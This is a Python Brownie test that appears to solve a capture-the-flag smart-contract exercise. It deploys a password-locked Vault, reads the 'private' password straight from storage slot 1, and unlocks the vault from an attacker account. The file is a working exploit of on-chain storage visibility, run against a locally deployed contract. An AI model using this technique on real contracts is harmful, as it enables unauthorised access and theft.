import secrets
from brownie import web3, accounts, Vault


def test_attack():
    owner = accounts[0]
    hacker = accounts[1]
    password = secrets.token_bytes(nbytes=32)
    vault = Vault.deploy(password, {'from': owner})
    assert vault.locked() == True
    read_password = web3.eth.get_storage_at(vault.address, 1)
    assert password == read_password
    vault.unlock(read_password, {'from': hacker})
    assert vault.locked() == False

